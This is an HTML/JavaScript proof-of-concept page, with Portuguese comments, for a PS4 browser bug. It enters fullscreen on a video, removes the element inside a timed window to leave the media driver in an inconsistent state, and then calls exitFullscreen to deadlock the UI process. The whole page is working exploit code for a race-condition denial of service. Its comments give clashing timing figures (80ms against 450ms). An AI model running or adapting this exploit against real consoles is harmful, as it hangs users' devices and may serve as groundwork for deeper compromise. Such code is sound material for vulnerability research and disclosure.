<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Manx Driver State Corruption</title>
</head>
<body>
    <h3>PS4 Manx Fullscreen POC</h3>
    
    <button id="btn-start">EXECUTE</button>
    
    <div id="log"></div>

<script>
    const SRC = 'teste.mp4';
    const ATTACK_DELAY = 450; // The bug in the hardcoded IPC window is located in the fullscreen animation window, which has a delay of 500ms.
    
  function log(msg) {
        const l = document.getElementById('log');
        l.innerHTML += `${msg}<br>`;
    }

    function logState(tag, element) {
        if (!element) return;
        let isFS = !!element.webkitDisplayingFullscreen;
        let isConn = !!element.isConnected;
        log(`[${tag}] displayingFS: <b>${isFS}</b> | isConnected: <b>${isConn}</b>`);
    }

    document.getElementById('btn-start').addEventListener('click', async () => {
        document.getElementById('log').innerHTML = '';
        document.getElementById('btn-start').disabled = true;

        log('[SYSTEM] Initializing Hardware Decoder...');
        let v1 = document.createElement('video');
        v1.src = SRC;
        v1.autoplay = true;
        document.body.appendChild(v1);

        // Espera o motor de hardware carregar o arquivo
        await new Promise(r => setTimeout(r, 800));

        log('[SYSTEM] Requesting Fullscreen...');
        try { 
            v1.webkitEnterFullscreen(); 
        } catch(e) { 
            log('[ERROR] Failed to enter Fullscreen: ' + e.message);
            return;
        }

        // Janela crítica de 80ms para o Teardown
        await new Promise(r => setTimeout(r, ATTACK_DELAY));

        
        logState("PRE-TEARDOWN", v1);

        // Execução do Teardown
        v1.removeAttribute('src');
        v1.load();
        v1.remove();

        logState("POST-TEARDOWN", v1);

        // Aguarda o processamento da fila de eventos
        await new Promise(r => setTimeout(r, 500));
        v1 = null;

        log('[SYSTEM] Verifying UIProcess State...');
        const v2 = document.createElement('video');
        v2.src = SRC;
        document.body.appendChild(v2);
        
        let gotInvalidState = false;
        
        try { 
            v2.webkitEnterFullscreen(); 
        } catch(e) { 
            if(e.name === 'InvalidStateError') {
                gotInvalidState = true;
            }
        }
        v2.remove();

        // --- LINHA ADICIONADA AQUI ---
        log(`[NATIVE ERROR] InvalidStateError: <b>${gotInvalidState}</b>`);
        // ----------------------------

        if (gotInvalidState) {
            log('<span style="color: red; font-weight: bold;">[RESULT] Driver in an inconsistent state.</span>');
            
            setTimeout(() => {
                log('[SYSTEM] Triggering Deadlock (exitFullscreen)...');
                try { 
                    document.webkitExitFullscreen(); 
                } catch(err) {
                    log('[INFO] UIProcess stopped responding.');
                }
            }, 1000);
        } else {
            log('[ERROR] The system synchronized the state correctly. Try adjusting the delay.');
            document.getElementById('btn-start').disabled = false;
        }
    });
</script>

</body>
</html>
